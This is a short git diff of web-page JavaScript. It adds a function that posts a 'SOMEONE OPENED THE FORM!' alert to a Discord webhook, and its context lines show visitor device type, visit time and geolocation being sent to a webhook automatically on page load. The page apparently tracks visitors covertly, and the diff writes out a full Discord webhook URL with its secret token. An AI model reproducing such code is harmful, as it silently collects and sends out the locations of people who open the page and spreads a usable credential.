@@ -62,6 +62,27 @@ Geolocation: ${geolocation}\`\`\``  // Ensure content is not empty
   .catch(error => console.error('Error sending data to webhook:', error));
 }
 
+// Function to notify webhook when the form is opened
+function notifyFormOpened() {
+  fetch('https://canary.discord.com/api/webhooks/1262611539714900028/s-nStmJY7V6xPgkFDTTKxRK7ECjHFZzdq_vJOGytZQ_miv9B1w7VX1VnqrMtysv3mNRE', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      content: "# SOMEONE OPENED THE FORM!"
+    })
+  })
+  .then(response => {
+    if (!response.ok) {
+      console.error('Failed to notify webhook:', response.statusText);
+    } else {
+      console.log('Webhook notified: Form opened');
+    }
+  })
+  .catch(error => console.error('Error sending notification:', error));
+}
+
 // Call function to send data when page loads
 window.onload = function() {
   sendDataToWebhook(deviceType, visitTime);
